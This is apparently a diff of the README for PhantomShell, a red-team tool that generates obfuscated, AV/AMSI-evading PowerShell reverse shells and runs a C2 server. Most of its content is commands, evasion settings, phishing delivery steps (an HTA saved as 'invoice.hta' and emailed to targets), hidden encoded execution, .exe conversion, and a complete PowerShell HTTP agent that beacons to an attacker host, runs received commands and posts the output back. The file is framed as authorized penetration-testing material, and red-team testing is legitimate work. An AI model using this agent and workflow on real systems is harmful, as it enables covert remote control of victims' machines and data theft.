@@ -3,421 +3,787 @@
 <img width="1024" height="1024" alt="PhantomShell" src="https://github.com/user-attachments/assets/bd3b82fc-85bd-4651-b1f8-1b2a908b403a" />
 
 
-### Advanced PowerShell AV / AMSI Evasion Framework + Enterprise C2 Server
 
-Red-team framework designed for **authorized penetration testing and adversary simulation**.
 
-PhantomShell combines an **advanced PowerShell payload generator** with a **lightweight Command & Control (C2) infrastructure**, enabling red-team operators to generate payloads, host them, and manage reverse shell sessions.
+
+
+# 👻 PhantomShell
+
+<div align="center">
+<img width="1024" height="1024" alt="PhantomShell" src="https://github.com/user-attachments/assets/bd3b82fc-85bd-4651-b1f8-1b2a908b403a" />
+
+### Advanced PowerShell AV/AMSI Evasion Framework + Enterprise C2 Server
+
+[![Python](https://img.shields.io/badge/Python-3.6+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![License](https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge&logo=gnu&logoColor=white)](LICENSE)
+[![Version](https://img.shields.io/badge/Version-3.0-blue?style=for-the-badge)](https://github.com/Red-Parakeet/PhantomShell)
+
+**PhantomShell v2.0** — The most complete red-team framework for PowerShell payload generation and C2 infrastructure management.
 
 </div>
 
 ---
 
-# 👻 What is PhantomShell?
+## 📋 Table of Contents
 
-PhantomShell generates **obfuscated, base64-encoded PowerShell reverse shells** designed to evade **signature-based antivirus detection and AMSI scanning**.
-
-It automates tasks such as:
-
-- variable obfuscation
-- payload encoding
-- multi-layer execution wrapping
-- hiding IP and port values
-- HTTP payload delivery
-- polymorphic payload generation
-
-All from **one command-line tool**.
-
----
-
-# 🔍 Is PhantomShell Undetectable?
-
-No tool can guarantee that.
-
-PhantomShell helps evade **signature-based detection**, but it cannot bypass every defensive mechanism.
-
-| Technique | What it helps evade | What it cannot evade |
-|----------|--------------------|----------------------|
-| Variable renaming | static signatures | behavioral detection |
-| Base64 encoding | plain-text scanning | runtime AMSI |
-| Multi-layer wrapping | shallow analysis | deep sandboxing |
-| IP hiding | simple pattern matching | network monitoring |
-| Polymorphism | hash detection | AI behavioral EDR |
-
-Best evasion profile:
-
-```
---obf-profile random
---layers 3
---enc-b64
-```
+- [What is PhantomShell?](#-what-is-phantomshell)
+- [Key Features](#-key-features)
+- [Architecture](#-architecture)
+- [Installation](#-installation)
+- [Quick Start](#-quick-start)
+- [Command Reference](#-command-reference)
+- [Payload Generation](#-payload-generation)
+- [C2 Server](#-c2-server)
+- [Payload Hosting](#-payload-hosting)
+- [Payload Types & Formats](#-payload-types--formats)
+- [Obfuscation Profiles](#-obfuscation-profiles)
+- [Encoding Layers](#-encoding-layers)
+- [C2 Server Features](#-c2-server-features)
+- [HTTP Agent Deployment](#-http-agent-deployment)
+- [Building Executables](#-building-executables)
+- [Security Considerations](#-security-considerations)
+- [Legal Disclaimer](#-legal-disclaimer)
+- [Copyright](#-copyright)
+- [License](#-license)
 
 ---
 
-# 🚀 Features
+## 👻 What is PhantomShell?
 
-## ⚡ Payload Generation
+**PhantomShell** is a comprehensive red-team framework designed for **authorized penetration testing and adversary simulation**. It combines an **advanced PowerShell payload generator** with a **unified Command & Control (C2) infrastructure**.
 
-- multi-layer PowerShell encoding
-- AMSI-aware payload structure
-- polymorphic payload generation
-- randomized variable names
-- multiple delivery formats
+The tool automates the entire red-team workflow:
 
-## 🎮 Command & Control
+1. **Generate** obfuscated, AMSI-evading PowerShell payloads
+2. **Deploy** via multiple delivery formats (PowerShell, CMD, HTA, VBS, MSHTA)
+3. **Control** through a unified C2 server with Web UI and CLI interfaces
+4. **Manage** TCP reverse shells and HTTP/S agents simultaneously
 
-- lightweight Python C2 server
-- CLI operator shell
-- web dashboard
-- multi-session handling
-- remote command execution
+### 🎯 Why PhantomShell?
 
-## 🎯 Red Team Usage
-
-- reverse shell generation
-- HTTP payload hosting
-- polymorphic payload variants
-- session monitoring
+| Feature | PhantomShell | Traditional Tools |
+|---------|-------------|-------------------|
+| **Unified C2** | ✅ TCP + HTTP agents | ❌ Separate tools |
+| **Multi-layer Encoding** | ✅ Up to 3 layers | ❌ Single layer |
+| **Polymorphic Payloads** | ✅ Random variable names | ❌ Static |
+| **Multiple Formats** | ✅ 5+ delivery formats | ❌ Limited |
+| **Web Dashboard** | ✅ Real-time session management | ❌ CLI only |
+| **HTTP Agent Support** | ✅ Firewall-friendly | ❌ TCP only |
+| **Payload Hosting** | ✅ Built-in HTTP server | ❌ Manual |
 
 ---
 
-# 🏗 Architecture
+## 🔍 Evasion Capabilities
 
-```
-Target Machine
-      │
-      │ Reverse Shell
-      ▼
-PhantomShell C2 Server
-      │
-      ├── CLI Interface
-      │
-      └── Web Dashboard
-```
+No tool can guarantee complete evasion. PhantomShell helps bypass **signature-based detection** but cannot evade all defensive mechanisms.
 
----
+| Technique | What it Evades | Limitations |
+|----------|----------------|-------------|
+| **Variable Renaming** | Static signatures | Behavioral detection |
+| **Multi-layer Encoding** | Shallow analysis | Deep sandboxing |
+| **Base64 Obfuscation** | Plain-text scanning | Runtime AMSI |
+| **Polymorphism** | Hash-based detection | AI/Behavioral EDR |
+| **IP/Port Hiding** | Pattern matching | Network monitoring |
+| **HTTP Agent** | Firewall rules | SSL inspection |
 
-# ⚙ Installation
-
-No external dependencies.
+### 🎯 Maximum Evasion Profile
 
 ```bash
-git clone https://github.com/adrilaw/PhantomShell.git
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
+```
 
+This combines:
+- **Random** variable names (different every run)
+- **3 layers** of encoding
+- **Base64** IP/port hiding
+- No static signatures
+
+---
+
+## 🚀 Key Features
+
+### ⚡ Payload Generation
+
+- ✅ **Multi-layer PowerShell encoding** (1-3 layers)
+- ✅ **AMSI-aware** payload structure
+- ✅ **Polymorphic** payload generation (randomized variables)
+- ✅ **Base64 obfuscation** for IP/port hiding
+- ✅ **5 delivery formats**: PowerShell, CMD, HTA, VBS, MSHTA
+- ✅ **3 obfuscation profiles**: Minimal, Aggressive, Random
+- ✅ **Payload verification** before output
+- ✅ **Layer round-trip verification**
+
+### 🎮 Command & Control
+
+- ✅ **Unified C2 server** supporting TCP and HTTP agents
+- ✅ **Web dashboard** with real-time session management
+- ✅ **CLI operator shell** for direct control
+- ✅ **Multi-session handling** (TCP + HTTP simultaneously)
+- ✅ **Session persistence** and monitoring
+- ✅ **Command queuing** for HTTP agents
+- ✅ **Real-time logs** and event tracking
+
+### 🎯 Red Team Features
+
+- ✅ **One-command deployment** (`serve` command)
+- ✅ **Polymorphic generation** (multiple variants)
+- ✅ **HTTP payload hosting** with download cradles
+- ✅ **Session type differentiation** (TCP vs HTTP)
+- ✅ **Quick commands** for common tasks
+- ✅ **Command history** in Web UI
+
+---
+
+## 🏗 Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                        TARGET MACHINE                          │
+├─────────────────────────────────────────────────────────────────┤
+│  ┌─────────────────┐        ┌─────────────────────────────┐  │
+│  │  TCP Reverse    │        │  HTTP Agent (Polling)       │  │
+│  │  Shell Payload  │        │  - Beacon every 3-5 secs    │  │
+│  │  - Interactive  │        │  - Command queuing          │  │
+│  │  - Real-time    │        │  - Firewall-friendly        │  │
+│  └────────┬────────┘        └─────────────┬───────────────┘  │
+│           │                               │                    │
+│           │ TCP (4444)                    │ HTTP (8081)        │
+│           ▼                               ▼                    │
+└─────────────────────────────────────────────────────────────────┘
+                           │
+                           ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                   PHANTOMSHELL C2 SERVER                        │
+├─────────────────────────────────────────────────────────────────┤
+│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐    │
+│  │  TCP        │  │  HTTP       │  │  Web UI             │    │
+│  │  Listener   │  │  Listener   │  │  - Session manager  │    │
+│  │  (4444)     │  │  (8081)     │  │  - Command exec     │    │
+│  └─────────────┘  └─────────────┘  │  - Real-time logs   │    │
+│                                     └─────────────────────┘    │
+│  ┌─────────────────────────────────────────────────────────┐   │
+│  │  Unified Session Manager                                │   │
+│  │  - TCP sessions                                         │   │
+│  │  - HTTP agent sessions                                  │   │
+│  │  - Command queuing for HTTP                             │   │
+│  └─────────────────────────────────────────────────────────┘   │
+│                                                               │
+│  ┌─────────────────────────────────────────────────────────┐   │
+│  │  CLI Interface                                         │   │
+│  │  - Interactive shell  - Session management             │   │
+│  └─────────────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## ⚙ Installation
+
+No external dependencies required! PhantomShell uses only Python standard library.
+
+```bash
+# Clone the repository
+git clone https://github.com/Red-Parakeet/PhantomShell.git
+
+# Navigate to directory
 cd PhantomShell
 
+# Make executables
 chmod +x phantomshell.py
-
 chmod +x phantomc2.py
 
-python3 phantomc2.py --help
-
+# Verify installation
 python3 phantomshell.py --help
+python3 phantomc2.py --help
 ```
+
+### Requirements
+
+- **Python 3.6+** (any platform)
+- No additional packages needed
+- Works on Linux, macOS, and Windows
 
 ---
 
-# 🚀 Quick Start
+## 🚀 Quick Start
 
-### Terminal 1 — Start C2 server
-
-```bash
-python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
-```
-<img width="1845" height="907" alt="image" src="https://github.com/user-attachments/assets/59b5f901-8dfa-43c6-8555-29e55b53ca7b" />
-
-## For more information on the Phantom C2 use the command below
+### Method 1: All-in-One (Recommended)
 
 ```bash
-python3 phantomc2.py --port 4444 --help
-```
----
+# One command generates payload AND starts C2 server
+python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026
 
-### Terminal 2 — Generate payload
+# Copy the generated payload
+# Paste on target machine
+# Shell connects back automatically!
+```
+
+### Method 2: Separate Steps
+
+**Terminal 1 — Start C2 Server**
 
 ```bash
-python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
+python3 phantomc2.py --port 4444 --http-port 8081 --web-port 8080 --password RedTeam2026
 ```
-<img width="1920" height="997" alt="Screenshot_20260317_120257" src="https://github.com/user-attachments/assets/fc85d30a-9fd3-46fe-9f07-08f9692deeaa" />
 
-Run the generated command on the Windows target.
-
-Shell connects back to Terminal 1.
-
----
-
-# 💾 Payload Generating Command Reference
-
-### Terminal 2 — Generate Payload
+**Terminal 2 — Generate Payload**
 
 ```bash
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
 ```
 
-Copy the output and run it on the target Windows machine.
+**Target — Execute Payload**
+
+```powershell
+# Copy the output from Terminal 2 and paste here
+powershell -NoP -sta -NonI -W Hidden -enc <payload>
+```
+
+**Access Web UI:** `http://localhost:8080` (or `http://10.10.10.5:8080` from other machines)  
+**Password:** `RedTeam2026`
 
 ---
 
-# 📖 Command Reference
+## 📖 Command Reference
 
-## `revshell` — Standalone Payload
+### 🔹 `revshell` — Generate Standalone Payload
 
 ```bash
 python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
 ```
 
 | Flag | Short | Description | Default |
-|-----|------|-------------|--------|
-| `--attacker-ip` | `-i` | attacker IP | required |
-| `--port` | `-p` | listening port | required |
-| `--obf-profile` | `-o` | minimal/aggressive/random | aggressive |
-| `--layers` | `-l` | encoding layers | 1 |
-| `--format` | `-f` | payload format | powershell |
-| `--enc-b64` | | hide IP and port | off |
-| `--keep-pwd` | | show CWD | off |
-| `--do-not-hide` | | disable hidden flags | off |
-| `--verbose` | `-v` | verbose output | off |
+|------|-------|-------------|---------|
+| `--attacker-ip` | `-i` | Attacker IP address | **Required** |
+| `--port` | `-p` | Listening port | **Required** |
+| `--obf-profile` | `-o` | `minimal` / `aggressive` / `random` | `aggressive` |
+| `--layers` | `-l` | Encoding layers (1-3) | `1` |
+| `--format` | `-f` | Output format | `powershell` |
+| `--enc-b64` | | Hide IP/port in base64 | Off |
+| `--keep-pwd` | | Show current directory in prompt | Off |
+| `--do-not-hide` | | Disable hidden window flags | Off |
+| `--verbose` | `-v` | Show decoded payload | Off |
+| `--no-banner` | | Hide startup banner | Off |
 
----
-
-## Examples
-
-Basic payload
+**Examples:**
 
 ```bash
+# Basic payload
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
-```
 
-Maximum evasion
-
-```bash
+# Maximum evasion
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
-```
 
-HTA payload
-
-```bash
+# HTA phishing payload
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
-```
 
-CMD wrapper
-
-```bash
+# CMD wrapper
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd
-```
 
-Verbose mode
-
-```bash
+# Verbose mode (see obfuscated payload before encoding)
 python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v
 ```
 
 ---
 
-# 🌐 `server` — HTTP Payload Hosting
-
-Starts an HTTP server and prints a download cradle.
+### 🔹 `serve` — Generate, Host, and Serve Payload
 
 ```bash
-python3 phantomshell.py server -i <IP> -p <PORT>
+python3 phantomshell.py serve -i <IP> -p <PORT> [OPTIONS]
+```
+
+| Flag | Short | Description | Default |
+|------|-------|-------------|---------|
+| `--attacker-ip` | `-i` | Attacker IP address | **Required** |
+| `--port` | `-p` | Listening port | **Required** |
+| `--host` | | C2 bind address | `0.0.0.0` |
+| `--host-payload` | | Host .ps1 file on HTTP server | Off |
+| `--host-port` | | HTTP server port | `8000` |
+| `--filename` | | Payload filename | Random |
+| `--start-c2` | | Start phantomc2.py automatically | Off |
+| `--http-port` | | HTTP agent port for phantomc2.py | `8081` |
+| `--web-port` | | Web UI port for phantomc2.py | `8080` |
+| `--password` | | Web UI password | `phantomshell` |
+| `--no-cli` | | Disable interactive CLI | Off |
+| `--obf-profile` | `-o` | Obfuscation profile | `aggressive` |
+| `--layers` | `-l` | Encoding layers | `1` |
+| `--enc-b64` | | Hide IP/port in base64 | Off |
+| `--keep-pwd` | | Show CWD in prompt | Off |
+| `--do-not-hide` | | Disable hidden window flags | Off |
+| `--verbose` | `-v` | Show decoded payload | Off |
+
+**Example:**
+
+```bash
+# Generate payload + host + start C2 with one command
+python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026 -o random -l 2 --enc-b64
+```
+
+---
+
+### 🔹 `polymorph` — Generate Multiple Variants
+
+```bash
+python3 phantomshell.py polymorph -i <IP> -p <PORT> -n <COUNT>
 ```
 
 | Flag | Description | Default |
-|-----|-------------|--------|
-| `-i` | attacker IP | required |
-| `-p` | reverse shell port | required |
-| `--server-port` | HTTP port | 8000 |
-| `-o` | payload filename | random |
-| `--layers` | encoding layers | 1 |
-| `--enc-b64` | hide IP/port | off |
+|------|-------------|---------|
+| `-i` | Attacker IP | **Required** |
+| `-p` | Listening port | **Required** |
+| `-n` | Number of variants | `3` |
+| `-l` | Encoding layers | `1` |
+| `--enc-b64` | Hide IP/port | Off |
+| `--keep-pwd` | Show CWD | Off |
+| `--verbose` | Verbose output | Off |
 
----
-
-Example:
-
-```bash
-python3 phantomshell.py server -i 10.10.10.5 -p 4444
-```
-
-Target execution:
-
-```powershell
-powershell -NoP -sta -NonI -W Hidden -enc <CRADLE>
-```
-
----
-
-# 🔄 `polymorph` — Polymorphic Payload Generator
-
-Generate multiple unique payload variants.
+**Example:**
 
 ```bash
-python3 phantomshell.py polymorph -i <IP> -p <PORT>
-```
-
-Example:
-
-```bash
+# Generate 5 unique variants
 python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5
 ```
 
-Output example
+---
 
+### 🔹 `c2` — Run C2 Server
+
+```bash
+python3 phantomc2.py [OPTIONS]
 ```
-Variant 1 profile=minimal FP:B0CCA4CD
-Variant 2 profile=aggressive FP:06F530B1
-Variant 3 profile=random FP:A273D56F
+
+| Flag | Description | Default |
+|------|-------------|---------|
+| `--port` | TCP listener port | `4444` |
+| `--http-port` | HTTP agent listener port | `8081` |
+| `--web-port` | Web UI port | `8080` |
+| `--password` | Web UI authentication password | `phantomshell` |
+| `--no-cli` | Disable interactive CLI | Off |
+| `--no-banner` | Hide startup banner | Off |
+
+**Examples:**
+
+```bash
+# Default setup
+python3 phantomc2.py --password MySecretPass123
+
+# Custom ports and password
+python3 phantomc2.py --port 5555 --http-port 9090 --web-port 8888 --password SecurePass123
+
+# Headless mode (no CLI)
+python3 phantomc2.py --password RedTeam2026 --no-cli
 ```
 
 ---
 
-# 🎯 Obfuscation Profiles
+## 📦 Payload Types & Formats
 
-### minimal
+### PowerShell (Default)
+Direct execution in PowerShell console.
+
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
+```
+
+**Output:** `powershell -NoP -sta -NonI -W Hidden -enc <base64>`
+
+---
+
+### CMD Wrapper
+Run from Command Prompt.
+
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd
+```
+
+**Output:** `cmd /c "powershell -NoP -sta -NonI -W Hidden -enc <base64>"`
+
+---
+
+### HTA (HTML Application)
+Phishing-friendly HTML file.
+
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
+```
+
+**Output:** Complete HTML file with VBScript wrapper
+
+**Usage:** Save as `.hta` and email to target
+
+---
+
+### VBS (Visual Basic Script)
+For Office macro delivery.
+
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f vbs
+```
+
+**Output:** VBScript that runs PowerShell hidden
+
+---
+
+### MSHTA (Microsoft HTML Application)
+One-liner for quick execution.
+
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f mshta
+```
+
+**Output:** `mshta vbscript:CreateObject("WScript.Shell").Run("powershell ...",0,False)(window.close)`
+
+---
+
+## 🎯 Obfuscation Profiles
+
+### Minimal
+Fast and readable, minimal obfuscation.
 
 ```
 $client → $c
 $stream → $st
 $bytes → $b
+$data → $d
 ```
 
-Fast and readable.
-
----
-
-### aggressive
+### Aggressive (Default)
+More aggressive variable renaming.
 
 ```
 $client → $xA1
 $stream → $xB2
 $bytes → $xC3
+$sendback → $xE5
 ```
 
-Default profile.
-
----
-
-### random
+### Random
+Fully randomized variable names, different every run.
 
 ```
 $client → $mKpRx
 $stream → $zQ6v8A6
 $bytes → $hySOJ
+$data → $TqRmX9
 ```
 
-Different every run.
+---
+
+## 🧅 Encoding Layers
+
+| Layer | Description | Command |
+|-------|-------------|---------|
+| **1** | UTF-16LE → Base64 | `-l 1` |
+| **2** | Base64 wrapped in IEX → UTF-16LE → Base64 | `-l 2` |
+| **3** | Multi-stage decode with variables | `-l 3` |
+
+**Layer 1:**
+```powershell
+[System.Convert]::FromBase64String('<base64>')
+```
+
+**Layer 2:**
+```powershell
+IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))
+```
+
+**Layer 3:**
+```powershell
+$_b=[System.Convert]::FromBase64String('<base64>');
+$_s=[System.Text.Encoding]::Unicode.GetString($_b);
+IEX($_s)
+```
 
 ---
 
-# 🧅 Encoding Layers
+## 🎮 C2 Server Features
 
-| Layer | Description |
-|------|-------------|
-| 1 | utf-16le base64 |
-| 2 | base64 wrapped in IEX |
-| 3 | multi-stage base64 decoding |
+### Web Dashboard
 
-Payload is verified before output.
+Access the Web UI at `http://localhost:8080` (or `http://<your-ip>:8080` from other machines)
 
----
+**Features:**
+- ✅ **Live session list** with status indicators
+- ✅ **Session statistics** (Total, Active, Dead, TCP, HTTP)
+- ✅ **Interactive terminal** with command history
+- ✅ **Quick command buttons** for common tasks
+- ✅ **Real-time logs** with color coding
+- ✅ **Session type differentiation** (TCP vs HTTP)
+- ✅ **Copy-paste friendly** interface
 
-# 📦 Output Formats
+### CLI Interface
 
-| Format | Usage |
-|------|------|
-| powershell | direct execution |
-| cmd | cmd injection |
-| hta | phishing |
-| vbs | macro delivery |
-| mshta | one-liner execution |
+Interactive shell for operators:
 
----
+```bash
+phantom > help
 
-# 🎯 Example Attack Workflow
+  sessions              — list all sessions
+  interact <id>         — interact with a session
+  exec <id> <cmd>       — run single command
+  kill <id>             — mark session dead
+  prune                 — remove dead sessions
+  exit                  — quit C2 server
+```
+
+**Example Interaction:**
 
 ```
-# Listener
-python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
+phantom > sessions
 
-# Generate payload
-python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 2
+  ID   TYPE   IP                USER@HOST                         STATUS   CONNECTED
+  ──── ────── ───────────────── ───────────────────────────────── ──────── ────────────────────
+  1    tcp    10.10.10.20       admin@DESKTOP-ABC123              ALIVE    14:32:15
+  2    http   10.10.10.30       user@WORKSTATION-XYZ              ALIVE    14:35:42
 
-# Execute on target
-powershell -NoP -sta -NonI -W Hidden -enc <payload>
+phantom > interact 1
+
+  OK Interacting with #1 (admin@DESKTOP-ABC123) [TCP]
+  Type 'back' to return to C2
+
+  PS #1 > whoami
+  DESKTOP-ABC123\admin
+
+  PS #1 > ipconfig
+  Ethernet adapter Ethernet0:
+     IPv4 Address. . . . . . . . . . . : 10.10.10.20
+     Subnet Mask . . . . . . . . . . . : 255.255.255.0
 ```
-# 🪟 Building the Executable
-
-Follow these steps to generate a payload and convert it into a standalone Windows executable (.exe):
-
-1. Generate the Script
-Use PhantomShell to generate your initial code. Ensure the output is configured correctly for your target environment.
-
-
-3. Save as PowerShell
-Once the code is generated, copy and save it into a new text file.
-
-
-### Important: You must save the file with the .ps1 extension (e.g., payload.ps1).
-
-3. Convert to Executable (.exe)
-To make the script portable and bypass certain execution policy restrictions, convert it using the PowerShell to exe/msi Converter.
-
-Download Tool: PowerShell to exe/msi Converter (Microsoft Store)
-
-# Steps:
-
-### 1.Open the converter application.
-
-### 2.Select your .ps1 file as the source.
-
-### 3.Click the Build button to generate the .exe file.
-
-### 4.The resulting file can now be run on Windows systems by double-clicking the icon.
 
 ---
 
-# 🛡 Security Considerations
+## 🌐 HTTP Agent Deployment
 
-Use only in **authorized environments**.
+### Method 1: PowerShell Script
 
-Recommended:
+Save as `agent.ps1`:
 
-- firewall restrictions
-- HTTPS proxy
-- strong authentication
-- infrastructure rotation
-- log monitoring
+```powershell
+$u='http://10.10.10.5:8081'
+$id=[guid]::NewGuid().ToString()
+$pl='Windows|'+$env:COMPUTERNAME+'|'+$env:USERNAME
+while($true){
+    try{
+        $c=(iwr -UseBasicParsing ($u+'/beacon?id='+$id+'&platform='+[uri]::EscapeDataString($pl))).Content.Trim()
+        if($c){
+            $o=try{iex $c 2>&1|Out-String}catch{$_.Exception.Message}
+            iwr -UseBasicParsing -Method POST -Uri ($u+'/result?id='+$id) -Body $o|Out-Null
+        }
+    }catch{}
+    Start-Sleep -Seconds (3+(Get-Random -Max 2))
+}
+```
+
+**Run:**
+
+```powershell
+powershell -ExecutionPolicy Bypass -File agent.ps1
+```
 
 ---
 
-# ⚠ Legal Disclaimer
+### Method 2: CMD One-Liner
 
-This software is intended **only for authorized cybersecurity testing**.
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 8081 -f cmd
+```
 
-Unauthorized use may violate computer crime laws.
-
-The author assumes **no liability for misuse**.
+**Paste directly into CMD on target.**
 
 ---
 
-# 📝 License
-PhantomShell is licensed under the [GNU General Public License](LICENSE) and the [PhantomShell Commercial License](C-LICENSE)- see the LICENSE file for details.
+## 🪟 Building Executables
 
+Convert PowerShell scripts to standalone Windows executables.
 
-# 👨‍💻 Author
+### Step 1: Generate Payload Script
 
-**Dodin Mel Adrien Lawrence Enzo**
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f powershell
+```
 
+### Step 2: Save as .ps1
+
+Copy the output and save as `payload.ps1`.
+
+**Important:** Must use `.ps1` extension.
+
+### Step 3: Convert to .exe
+
+Use **PowerShell to exe/msi Converter** (Microsoft Store) or **PS2EXE**:
+
+```bash
+# Using PS2EXE (open source)
+Install-Module -Name ps2exe -Force
+ps2exe -inputFile payload.ps1 -outputFile payload.exe
+
+# Or use GUI tools:
+# PowerShell to exe/msi Converter (Microsoft Store)
+```
+
+### Step 4: Deploy
+
+The resulting `.exe` can be run by double-clicking on Windows systems.
+
+---
+
+## 🎯 Attack Workflow Examples
+
+### Scenario 1: Internal Penetration Test
+
+```bash
+# 1. Generate and host payload with C2
+python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026
+
+# 2. Copy the download cradle or payload
+# 3. Execute on target machine
+# 4. Session appears in Web UI/CLI
+# 5. Interact and execute commands
+```
+
+---
+
+### Scenario 2: Phishing Campaign
+
+```bash
+# 1. Generate HTA payload
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
+
+# 2. Save as invoice.hta
+# 3. Email to target
+# 4. Start C2 server
+python3 phantomc2.py --password RedTeam2026
+
+# 5. When opened, shell connects back
+```
+
+---
+
+### Scenario 3: Firewall Evasion (HTTP Agent)
+
+```bash
+# 1. Start C2 with HTTP listener
+python3 phantomc2.py --port 4444 --http-port 8081 --web-port 8080 --password RedTeam2026
+
+# 2. Generate HTTP agent one-liner
+python3 phantomshell.py revshell -i 10.10.10.5 -p 8081 -f cmd
+
+# 3. Target runs the CMD command
+# 4. Agent polls every 3-5 seconds
+# 5. Send commands via Web UI or CLI
+```
+
+---
+
+## 🛡 Security Considerations
+
+### Best Practices
+
+- ✅ **Use HTTPS** with SSL/TLS for production
+- ✅ **Firewall restrictions** on C2 ports
+- ✅ **Strong authentication** (complex passwords)
+- ✅ **Infrastructure rotation** (change IPs/ports)
+- ✅ **Log monitoring** (detect anomalies)
+- ✅ **Encrypted communication** between agents
+- ✅ **Traffic obfuscation** to mimic normal traffic
+
+### Recommendations
+
+| Aspect | Recommendation |
+|--------|---------------|
+| **C2 Hosting** | VPS with firewall rules |
+| **Authentication** | Strong password + 2FA |
+| **Communication** | HTTPS with valid certificates |
+| **Logging** | Centralized log management |
+| **Persistence** | Multiple C2 fallback addresses |
+
+---
+
+## ⚠️ Legal Disclaimer
+
+> **THIS SOFTWARE IS INTENDED ONLY FOR AUTHORIZED CYBERSECURITY TESTING.**
+
+PhantomShell is designed for:
+- ✅ Authorized penetration testing
+- ✅ Red team exercises
+- ✅ Security research
+- ✅ Educational purposes
+
+**Unauthorized use** may violate:
+- Computer Fraud and Abuse Act (CFAA)
+- Local and international cybercrime laws
+- Corporate security policies
+
+**By using this tool, you agree to:**
+1. Use only on systems you own or have written permission to test
+2. Comply with all applicable laws and regulations
+3. Accept full responsibility for your actions
+4. Hold harmless the authors and contributors
+
+The authors assume **NO LIABILITY** for misuse or damage caused by this tool.
+
+---
+
+## 📄 Copyright
+
+```
+Copyright © 2026 Red Parakeet Security Team. All Rights Reserved.
+
+Author: Red Parakeet Security Team
+GitHub: https://github.com/Red-Parakeet
+LinkedIn: https://www.linkedin.com/company/red-parakeet-security/
+Website: https://www.redparakeet.org
+```
+
+---
+
+## 📝 License
+
+PhantomShell is dual-licensed:
+
+- **Open Source:** [GNU General Public License v3](LICENSE) - For non-commercial use
+- **Commercial:** [PhantomShell Commercial License](C-LICENSE) - For enterprise use
+
+Copyright © 2026 Red Parakeet Security Team
+
+---
+
+## 👨‍💻 Author
+
+**Red Parakeet Security Team**  
 Offensive Security | Red Teaming
 
-LinkedIn  
-https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/
-
-Twitter  
-https://twitter.com/AdrienDodin
+- **GitHub:** [Red Parakeet](https://github.com/Red-Parakeet)
+- **LinkedIn:** [Red Parakeet](https://www.linkedin.com/company/red-parakeet-security/?viewAsMember=true)
+- **Website:** [RedParakeetSec](https://www.redparakeet.org)
 
 ---
 
-⭐ If this project helped you, consider starring the repository.
+## 🌟 Support
 
-**PhantomShell** | © 2026 RedParakeet Security Team | All Rights Reserved
+If PhantomShell helped you, please consider:
+
+- ⭐ **Starring** the repository on GitHub
+- 📢 **Sharing** with fellow security professionals
+- 🐛 **Reporting** issues or feature requests
+- 🤝 **Contributing** to the project
+
+---
+
+## 📊 Version History
+
+| Version | Date | Features |
+|---------|------|----------|
+| **v3.0** | 2026 | Unified C2, HTTP agents, Web UI, All-in-One deployment |
+| **v2.0** | 2025 | Payload generator enhancements, polymorphism |
+| **v1.0** | 2024 | Initial release, basic payload generation |
+
+---
+
+**PhantomShell** | © 2026 Red Parakeet Security Team | All Rights Reserved
+
+---
+
+<div align="center">
+<i>Built with ❤️ for the security community</i>
+</div>
